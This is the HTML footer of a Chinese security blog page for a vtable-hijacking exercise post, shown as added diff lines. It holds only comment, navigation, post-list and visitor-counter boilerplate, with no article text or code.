+
+
+
+
+
+
+    
+        <section id="comments">
+    <style> aside.comment-bar { margin: auto 30px; }</style>
+    <div id="disqus_thread"></div>
+    <script>
+        var disqus_config = function(){
+            this.page.url = 'https://jayl1n.github.io/2021/07/04/realpwn-vtable-hijacking-exercise/';
+            this.page.identifier = '2021/07/04/realpwn-vtable-hijacking-exercise/';
+        };
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = '//jayl1n-github-io.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        }
+    </script>
+    
+    <script> loadComment(); </script>
+
+</section>
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="../../07/realpwn-heap-spary-exercise/" title="上一篇: 【RealPwn-2】 堆喷练习">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="../../01/use-inlinehook-technology-to-make-a-more-general-webshell/" title="下一篇: 利用 Hook 技术打造通用的 Webshell">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="../../../../2022/02/27/v8-sandbox-escape/">V8 沙盒绕过</a></li><li class="post-list-item"><a class="post-list-link" href="../../../10/05/pentest-gb28181-attack/">GB28181 的一点小问题</a></li><li class="post-list-item"><a class="post-list-link" href="../../07/realpwn-heap-spary-exercise/">【RealPwn-2】 堆喷练习</a></li><li class="post-list-item"><a class="post-list-link" href="">【RealPwn-1】 虚函数表劫持练习</a></li><li class="post-list-item"><a class="post-list-link" href="../../01/use-inlinehook-technology-to-make-a-more-general-webshell/">利用 Hook 技术打造通用的 Webshell</a></li><li class="post-list-item"><a class="post-list-link" href="../../../06/23/compile-v8-on-windows10/">在 Win10 上编译 V8 引擎</a></li><li class="post-list-item"><a class="post-list-link" href="../../../02/05/antiav-jsp-webshell/">JSP免杀 —— 绕过智能AI？</a></li><li class="post-list-item"><a class="post-list-link" href="../../../01/03/compile-virtualbox-on-macos10-15/">MacOS 下编译 VirtualBox</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2020/04/10/pentest-cobaltstrike-improve/">魔改 CobaltStrike 3.14 实现域前置自定义端口</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2020/02/13/java-nohup-implementation/">Java 实现后台执行</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2020/01/04/happy-new-year-2020/">2020 大家新年快乐鸭</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/06/26/sctf-2019-babyEoP-Writeup/">SCTF2019 babyEoP Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/03/29/pentest-getpassword/">Windows下抓取明文密码</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/01/08/tools-load-shellcode/">【GSL】 从内存加载 SHELLCODE 绕过AV查杀</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/12/30/java-audit-step-by-step-4/">从1开始的Java代码审计·第四弹·SSRF</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/11/15/java-audit-step-by-step-3/">从1开始的Java代码审计·第三弹·SQL注入</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/10/29/java-audit-step-by-step-2/">从1开始的Java代码审计·第二弹·基础篇（下）</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/10/25/java-audit-step-by-step-1/">从1开始的Java代码审计·第一弹·基础篇（上）</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/10/25/java-audit-step-by-step-0/">从1开始的Java代码审计·序</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/10/05/pentest-20181005/">渗透日记-20181005</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/09/18/summary-command-execution/">PHP中的命令执行</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/09/11/ichunqiu-web-BLOG/">i春秋-Web-BLOG</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/09/10/ichunqiu-web-SQLi/">i春秋-Web-SQLi</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/09/09/daily-life-20180909/">日常心路-180909</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/08/01/crawl-admin5/">爬虫之批量下载Admin5源码</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/07/31/yesterday-and-tomorrow/">昨天，明天</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2018-2023 Jayl1n
+            </div>
+            <div class="footer-right">
+                <span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+<script>
+    var now = new Date(); 
+    function createtime() { 
+        var grt= new Date("07/31/2018 00:00:00");//此处修改你的建站时间或者网站上线时间 
+        now.setTime(now.getTime()+250); 
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+        document.getElementById("timeDate").innerHTML = "本站已运行 "+dnum+" 天 "; 
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+    } 
+setInterval("createtime()",250);
+</script>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 20;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
